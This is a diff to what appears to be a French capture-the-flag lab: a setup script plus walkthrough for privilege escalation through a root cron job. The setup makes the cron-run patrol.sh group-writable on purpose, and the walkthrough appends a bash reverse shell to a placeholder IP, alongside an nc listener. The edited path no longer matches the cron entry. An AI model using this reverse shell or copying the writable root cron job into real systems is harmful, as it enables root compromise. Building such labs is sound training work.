@@ -87,6 +87,10 @@ CONF
 chown root:operative /opt/.herald/system.conf
 chmod 640 /opt/.herald/system.conf
 
+
+chown root:herald /opt/.scripts/patrol.sh
+chmod 770 /opt/.scripts/patrol.sh
+
 # Entree crontab
 echo "* * * * * root /opt/.scripts/patrol.sh" >> /etc/crontab
 
@@ -244,7 +248,7 @@ nc -lvnp 4444
 **Sur la machine victime (en tant que scheduler) :**
 
 ```bash
-echo "bash -i >& /dev/tcp/<VOTRE_IP>/4444 0>&1" >> /opt/.scripts/patrol.sh
+echo "bash -i >& /dev/tcp/<VOTRE_IP>/4444 0>&1" >> /opt/scripts/patrol.sh
 ```
 
 Moins d'une minute plus tard, le crontab execute le script modifie et envoie un reverse shell root.
